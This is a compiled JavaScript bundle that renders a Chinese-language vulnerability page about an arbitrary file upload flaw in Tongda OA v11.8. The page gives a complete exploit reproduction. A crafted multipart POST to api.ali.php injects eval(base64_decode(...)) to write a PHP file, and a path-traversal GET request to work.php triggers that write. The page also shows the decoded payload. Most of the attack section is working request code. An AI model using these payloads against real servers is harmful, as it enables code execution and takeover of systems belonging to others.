(window.webpackJsonp=window.webpackJsonp||[]).push([[141],{1859:function(t,a,s){t.exports=s.p+"assets/img/1628303888717-4ffc91a6-e87e-4e00-8bd5-b2218bb0772a.70c7bdb3.png"},1860:function(t,a,s){t.exports=s.p+"assets/img/1630513004438-e5a73ef6-8d65-40a1-9a3c-3be30cd7d164.da74a076.png"},1861:function(t,a,s){t.exports=s.p+"assets/img/1630513044174-8139c404-4f11-404e-be04-42d86b407bdd.420a6145.png"},1862:function(t,a,s){t.exports=s.p+"assets/img/1630513283771-36cc86c7-a150-4834-be64-243b20938165.83dcea54.png"},3198:function(t,a,s){"use strict";s.r(a);var r=s(64),n=Object(r.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"通达oa-v11-8-api-ali-php-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-8-api-ali-php-任意文件上传漏洞"}},[t._v("#")]),t._v(" 通达OA v11.8 api.ali.php 任意文件上传漏洞")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("通达OA v11.8")]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("登陆页面")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1859),alt:"img"}})]),t._v(" "),a("p",[t._v("像 api.ali.php 发送请求包")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("POST "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("mobile"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php HTTP"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nUser"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("422")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" multipart"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" boundary"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("502f67681799b07e4de6b503655f5cae\nAccept"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("502f67681799b07e4de6b503655f5cae\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Disposition"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" form"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" name"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" filename"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"fb6790f4.json"')]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("octet"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("stream\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"modular"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AllVariable"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw=="')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataAnalysis"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{\\"a\\":\\"錦\',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\"}"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("502f67681799b07e4de6b503655f5cae"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br")])]),a("a-checkbox",{attrs:{checked:""}},[t._v("参数a base解码")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==file_put_contents('../../fb6790f4.php','<?php phpinfo();?>');")]),a("br"),t._v(" "),a("p",[a("img",{attrs:{src:s(1860),alt:"img"}})]),t._v(" "),a("p",[t._v("再发送GET请求写入文件")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("inc"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("package"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("work"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?"),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("myoa"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("attach"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("approve_center"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2109")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("3E"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fb6790f4\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:s(1861),alt:"img"}})]),t._v(" "),a("p",[t._v("其中请求中对 2109 为 年月,路径为 "),a("code",[t._v("/fb6790f4.php,")])]),t._v(" "),a("p",[a("img",{attrs:{src:s(1862),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);